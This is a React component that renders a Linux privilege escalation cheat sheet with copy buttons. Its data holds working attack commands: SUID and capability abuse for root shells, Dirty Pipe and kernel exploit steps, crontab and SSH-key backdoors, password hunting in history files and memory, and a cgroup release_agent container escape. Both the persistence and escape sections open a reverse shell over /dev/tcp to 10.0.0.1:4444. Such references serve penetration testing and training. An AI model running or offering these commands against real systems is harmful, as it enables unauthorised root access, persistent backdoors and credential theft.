import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaTerminal, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const LinuxPrivEsc = () => {
  const [expandedSection, setExpandedSection] = useState('enumeration');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'enumeration',
      title: 'System Enumeration',
      content: [
        {
          type: 'command',
          value: 'uname -a',
          description: 'Kernel version and system architecture'
        },
        {
          type: 'command',
          value: 'cat /etc/*-release',
          description: 'Distribution version information'
        },
        {
          type: 'command',
          value: 'lscpu',
          description: 'CPU architecture information'
        },
        {
          type: 'command',
          value: 'lsblk -f',
          description: 'Block devices and filesystems'
        },
        {
          type: 'command',
          value: 'df -h',
          description: 'Disk space usage'
        },
        {
          type: 'markdown',
          value: `### Advanced Enumeration
- **Processes**: \`ps auxfww\` (Detailed process tree)
- **Network**: \`ss -tulnp\` (All listening ports with processes)
- **Cron Jobs**: \`ls -la /etc/cron* /var/spool/cron/crontabs\`
- **Services**: \`systemctl list-units --type=service --state=running\`
- **Capabilities**: \`getcap -r / 2>/dev/null\`
- **Sudo Rules**: \`sudo -l\` (Check sudo privileges)`
        }
      ]
    },
    {
      id: 'exploitation',
      title: 'Exploitation Techniques',
      content: [
        {
          type: 'markdown',
          value: `### SUID Binaries
\`\`\`bash
find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null
# Exploit known SUID binaries (GTFOBins)
./binary -payload 'chmod +s /bin/bash'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Capabilities Abuse
\`\`\`bash
# If python has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Dirty Pipe (CVE-2022-0847)
\`\`\`bash
gcc -o exploit exploit.c && ./exploit /usr/bin/su
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Kernel Exploits
\`\`\`bash
# Check kernel version
uname -r
# Search for exploits
searchsploit kernel 5.4.0
# Compile and run
gcc exploit.c -o exploit -static && ./exploit
\`\`\``
        }
      ]
    },
    {
      id: 'post-exploitation',
      title: 'Post-Exploitation',
      content: [
        {
          type: 'markdown',
          value: `### Persistence Methods
\`\`\`bash
# Cron job
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" >> /etc/crontab
# SSH backdoor
echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys
# Systemd service
cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Password Hunting
\`\`\`bash
# Find passwords in files
grep -riE 'password|passwd|pwd|credential' / 2>/dev/null
# Check history files
cat ~/.bash_history ~/.zsh_history
# Extract passwords from memory (needs root)
strings /dev/mem | grep -i pass
\`\`\``
        }
      ]
    },
    {
      id: 'containers',
      title: 'Container Escapes',
      content: [
        {
          type: 'markdown',
         value: `### Docker Breakout
\`\`\`bash
# Check if in container
cat /proc/1/cgroup | grep -qi docker && echo "In container"
# Exploit if privileged
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# SYS_ADMIN capability
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=\\\`sed -n 's/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p' /etc/mtab\\\`
echo "\\\${host_path}/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" >> /cmd
chmod +x /cmd
sh -c "echo \\\$\\\$ > /tmp/cgrp/x/cgroup.procs"
\`\`\``

        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaTerminal /> Linux Privilege Escalation Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive Linux privilege escalation techniques covering enumeration, 
          exploitation, post-exploitation, and container escapes.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => (
                    <div key={index} className="content-item">
                      {item.type === 'command' ? (
                        <div className="command-item">
                          <div className="command-header">
                            <code>{item.value}</code>
                            <button
                              onClick={() => handleCopy(item.value)}
                              className="copy-button small"
                            >
                              Copy
                            </button>
                          </div>
                          <p className="command-description">{item.description}</p>
                        </div>
                      ) : (
                        <div className="markdown-content">
                          <ReactMarkdown>
                            {item.value}
                          </ReactMarkdown>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default LinuxPrivEsc;